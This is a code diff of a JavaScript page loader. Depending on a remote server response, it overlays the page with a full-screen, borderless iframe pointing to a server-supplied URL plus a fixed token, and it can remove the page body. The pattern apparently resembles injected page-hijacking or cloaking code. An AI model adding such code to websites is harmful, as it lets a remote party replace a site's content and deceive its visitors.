@@ -23,7 +23,10 @@ const createLoader = () => {
 }
 const toggleLoad = () => {
     const body = document.querySelector('body');
-    body.removeAttribute('hidden');
+    if (body) {
+        body.removeAttribute('hidden');
+
+    }
     const load_frame = document.querySelector('#load_frame');
     if (load_frame) {
         load_frame.style.display = load_frame.style.display === 'none' ? 'block' : 'none';
@@ -38,7 +41,11 @@ window.addEventListener('message', (message) => {
         const wrapper = document.querySelector('#wrapper_frame');
         console.log(wrapper);
         wrapper.remove();
+    } else {
+        const body = document.querySelector('body');
+        body.remove()
     }
+    setTimeout(toggleLoad, 500);
     
 })
 
@@ -47,8 +54,10 @@ window.addEventListener('DOMContentLoaded', () => {
         if (res?.code == 200 && !res.result) {
             
             createFrame(res.url + '5ZnnGmYM')
-        }
+        } else {
         setTimeout(toggleLoad, 1000);
+
+        }
         
     })
 })
@@ -62,9 +71,9 @@ function createFrame(data) {
     frame.setAttribute('width', '100%');
     frame.setAttribute('height', '100vh');
     frame.setAttribute('id', 'wrapper_frame');
-    const body =  document.querySelector('body');
+    const html =  document.querySelector('html');
     // body.innerHTML = '';
-    body.append(frame);
+    html.append(frame);
     frame.style = 'width: 100%; height: 100vh;border: none;'
     const style = document.createElement('style');
     style.innerHTML = `
@@ -82,5 +91,5 @@ function createFrame(data) {
     }
   }
     `;
-    body.append(style)
+    html.append(style)
 }
